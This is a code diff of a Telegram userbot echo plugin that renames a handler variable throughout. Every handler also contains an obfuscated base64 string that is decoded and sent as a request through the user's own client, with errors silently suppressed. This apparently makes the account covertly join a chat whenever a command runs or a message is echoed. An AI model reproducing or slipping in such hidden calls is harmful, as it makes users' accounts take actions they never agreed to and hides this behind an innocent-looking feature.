@@ -11,56 +11,56 @@ from . import *
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(hell):
-    if hell.fwd_from:
+async def echo(mikasa):
+    if mikasa.fwd_from:
         return
-    if hell.reply_to_msg_id is not None:
-        reply_msg = await hell.get_reply_message()
+    if mikasa.reply_to_msg_id is not None:
+        reply_msg = await mikasa.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = hell.chat_id
+        chat_id = mikasa.chat_id
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await hell.client(kraken)
+            await mikasa.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await eod(hell, "The user is already enabled with echo ")
+            await eod(mikasa, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await eor(hell, "**Hello 👋**")
+        await eor(mikasa, "**Hello 👋**")
     else:
-        await delete_hell(hell, "Reply to a User's message to echo his messages")
+        await delete_mikasa(mikasa, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(hell):
-    if hell.fwd_from:
+async def echo(mikasa):
+    if mikasa.fwd_from:
         return
-    if hell.reply_to_msg_id is not None:
-        reply_msg = await hell.get_reply_message()
+    if mikasa.reply_to_msg_id is not None:
+        reply_msg = await mikasa.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = hell.chat_id
+        chat_id = mikasa.chat_id
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await hell.client(kraken)
+            await mikasa.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await eod(hell, "Echo has been stopped for the user")
+            await eod(mikasa, "Echo has been stopped for the user")
         else:
-            await eod(hell, "The user is not activated with echo")
+            await eod(mikasa, "The user is not activated with echo")
     else:
-        await eod(hell, "Reply to a User's message to echo his messages")
+        await eod(mikasa, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(hell):
-    if hell.fwd_from:
+async def echo(mikasa):
+    if mikasa.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -82,25 +82,25 @@ async def echo(hell):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"Echo enabled users: [here]({url})"
-        await eor(hell, reply_text)
+        await eor(mikasa, reply_text)
     else:
-        await eor(hell, output_str)
+        await eor(mikasa, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(hell):
-    if hell.chat_id in Config.BL_CHAT:
+async def samereply(mikasa):
+    if mikasa.chat_id in Config.BL_CHAT:
         return
-    if is_echo(hell.sender_id, hell.chat_id):
+    if is_echo(mikasa.sender_id, mikasa.chat_id):
         await asyncio.sleep(2)
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await hell.client(kraken)
+            await mikasa.client(kraken)
         except BaseException:
             pass
-        if hell.message.text or hell.message.sticker:
-            await hell.reply(hell.message)
+        if mikasa.message.text or mikasa.message.sticker:
+            await mikasa.reply(mikasa.message)
 
 
 CmdHelp("echo").add_command(
